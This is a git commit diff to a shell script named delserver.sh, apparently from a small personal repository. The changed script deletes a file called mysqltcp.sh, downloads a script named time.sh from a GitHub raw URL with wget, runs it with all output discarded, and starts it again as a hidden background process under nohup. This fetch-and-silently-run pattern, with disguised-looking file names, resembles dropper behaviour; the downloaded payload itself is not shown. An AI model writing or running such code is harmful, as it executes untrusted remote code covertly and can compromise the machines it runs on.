66448053655dad9b89f8c899ba00da633e68b50f
teshushu <905353149@qq.com>
2023-01-20 03:23:29 +0800

    Update delserver.sh

--- Bash/delserver.sh
+++ Bash/delserver.sh
@@ -1,6 +1,4 @@
-cd /tmp/
-rm -f mysqltcp.sh
-
+#!/bin/bash
 if [ -z $HOME ]; then
   echo "ERROR: Please define HOME environment variable to your home directory"
   exit 1
@@ -11,7 +9,11 @@ if [ ! -d $HOME ]; then
   echo '  export HOME=<dir>'
   exit 1
 fi
-cd /tmp/
+
+cd /$HOME/
+rm -f mysqltcp.sh
+
+cd $HOME/myssqltcp/
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/time.sh
-/bin/bash $HOME/time.sh >/dev/null 2>&1
+/bin/bash $HOME/myssqltcp/time.sh >/dev/null 2>&1
 nohup ./time.sh >/dev/null 2>&1 &
